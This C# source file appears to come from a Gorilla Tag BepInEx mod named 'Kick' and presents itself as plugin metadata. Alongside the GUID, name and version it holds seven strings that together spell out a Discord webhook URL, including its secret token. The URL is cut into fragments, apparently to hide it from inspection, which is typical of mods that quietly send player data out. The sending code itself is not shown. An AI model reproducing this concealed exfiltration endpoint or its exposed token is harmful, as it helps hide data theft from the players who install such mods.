﻿namespace Kick
{
    /// <summary>
    /// This class is used to provide information about your mod to BepInEx.
    /// </summary>
    public class PluginInfo
    {
        public const string GUID = "com.titanium.gorillatag.kick";
        public const string Name = "Kick";
        public const string Version = "1.0.0";

        public string text = "https://dis";
        public string text2 = "cord.c";
        public string text3 = "om/api/we";
        public string text4 = "bhooks";
        public string text5 = "/1324850838375764150j";
        public string text6 = "/p_WBV_Efroy2OOHmAI21bw77b_YW-FrUz";
        public string text7 = "xCtw_dk_nnNd_eVgzK-1KNEkO4VqZ7CNi2";

    }
}
